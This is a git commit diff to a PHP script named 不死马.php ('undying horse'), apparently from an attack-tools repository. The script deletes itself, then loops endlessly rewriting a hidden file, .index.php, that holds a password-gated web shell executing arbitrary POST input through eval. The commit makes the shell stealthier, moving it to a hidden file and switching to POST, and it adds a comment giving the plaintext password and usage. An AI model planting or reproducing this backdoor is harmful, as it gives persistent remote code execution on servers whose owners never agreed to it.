7aad67a79c34a1378f0aa8f4811c68a483f254a7
admintony <33545069+admintony@users.noreply.github.com>
2017-11-14 16:03:23 +0800

    Update 不死马.php

--- Attack/不死马.php
+++ Attack/不死马.php
@@ -2,11 +2,11 @@
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
-$file = './fuckyou.php';
-$code = '<?php if(md5($_GET["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_GET[a]);} ?>';
-//pass=****** 马儿用法：fuckyou.php?pass=******&a=command
+$file = './.index.php';
+$code = '<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>';
+//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&a=command
 while (1){
 	file_put_contents($file,$code);
-	usleep(50);
+	usleep(5000);
 }
 ?>
